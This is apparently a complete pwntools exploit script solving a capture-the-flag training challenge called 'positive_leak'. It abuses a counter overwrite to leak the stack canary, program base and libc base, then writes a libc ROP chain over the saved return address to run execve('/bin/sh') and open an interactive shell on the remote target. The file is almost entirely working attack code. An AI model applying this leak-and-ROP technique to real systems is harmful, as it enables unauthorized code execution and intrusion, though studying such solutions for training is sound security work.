from pwn import *
import time

CHALL_PATH = "./positive_leak_pathced"
CHALL = ELF(CHALL_PATH)
LIBC = ELF("./libc.so.6")
COMMANDS = """
# brva 0x13CA
# brva 0x127A
brva 0x13A9
c
"""

# gadget from libc.so.6
pop_rsi = 0x110a4d     # pop rsi; ret;
pop_rax = 0x0dd237     # pop rax; ret;
pop_rdi = 0x10f75b     # pop rdi; ret; 
pop_rsi = 0x110a4d     # pop rsi; ret; 
pop_rdx = 0x0188035    # pop rdx; bsf eax, eax; add rax, rdi; vzeroupper; ret;
syscall = 0x098fa6     # syscall; ret; 

# initialize the memory leak
memory_leak = []

if args.REMOTE:
    c = remote("positive-leak.training.offensivedefensive.it",8080,ssl=True)
else:
    if args.GDB:
        c = gdb.debug(CHALL_PATH, COMMANDS)
    else:
        c = process(CHALL_PATH)

# primitives

def print_numbers():
    c.recvuntil(b"> ")
    c.sendline(b"1")
def exit():
    c.recvuntil(b"> ")
    c.sendline(b"2")
def add_numbers(how_many, first, numbers):
    c.recvuntil(b"> ")
    c.sendline(b"0")
    c.recvuntil(b"add?> ")
    # c.sendline(str(how_many).encode())
    c.sendline(b"%d" % how_many)
    c.recvuntil(b"> ")
    # c.sendline(str(first).encode())
    c.sendline(b"%d" % first)
    for i in range(how_many):
        c.recvuntil(b"> ")
        # c.sendline(str(numbers[i]).encode())
        c.sendline(b"%d" % numbers[i])
def leak_canary():
    return int(memory_leak[9])
def leak_libc():
    return int(memory_leak[13])
def leak_main():
    return int(memory_leak[17])
def stack_dimension(size):
    return 16 * ((size*4 + 23) // 16)
def how_many_zeros_to_reach_counter(size):
    return (stack_dimension(size) // 8 + 1)

# ------------------------
# FIRST STAGE: Memory leak
# ------------------------

# make the program copy canary main and libc leak to numbers array, 0x10ffffffff will overwrite the counter i to 16
add_numbers(6, 0, [0, 0 , 0, 0, 0x10ffffffff, 5])

# leak memory containing canary, main address and libc address
print_numbers()
time.sleep(0.1)
memory_leak = c.recvuntil(b'**************\n').split(b'\n')
# print(memory_leak)

# extract canary
signed_canary_leak = leak_canary()
canary = signed_canary_leak & 0xffffffffffffffff
print(f"Canary: {hex(canary)}")

# extract main and calculate CHALL base address
main = leak_main()
CHALL.address = main - CHALL.symbols["main"]
print(f"ELF: {hex(CHALL.address)}")

# extract libc and calculate LIBC base address
libc = leak_libc()
LIBC.address = libc - 0x2A1CA # offset of the leak, calculated with gdb
print(f"LIBC: {hex(LIBC.address)}")

# ------------------------
# SECOND STAGE: ROP chain
# ------------------------

how_many_numbers_to_add = 100 # size of the temporary stack
zeros = how_many_zeros_to_reach_counter(how_many_numbers_to_add)
sRIP_positon = 58 # after infinite tentative... we have a sRIP

c.recvuntil(b"> ")
c.sendline(b"0")
c.recvuntil(b"add?> ")
c.sendline(b"%d" % how_many_numbers_to_add)

# Debug
# print(f"Place a breakpoint at {hex(LIBC.address + pop_rdx)}")

# Fill the stack with zeros
for i in range(zeros):
    c.recvuntil(b"> ")
    c.sendline(b"0")

# Overwrite the counter 'i' to 58
c.recvuntil(b"> ")
c.sendline(b"%d" % ((sRIP_positon << 32) + 0xffffffff))

# Overwrite sRIP with the ROP chain
ROP_CHAIN = [
    LIBC.address + pop_rdx,
    0,
    LIBC.address + pop_rsi,
    0,
    LIBC.address + pop_rax,
    0x3b,
    LIBC.address + pop_rdi,
    next(LIBC.search(b"/bin/sh\x00")),
    LIBC.address + syscall,
    -1 # exit the function and trigger the ROP chain
]

for gadget in ROP_CHAIN:
    c.recvuntil(b"> ")
    c.sendline(b"%d" % gadget)
    

c.interactive()

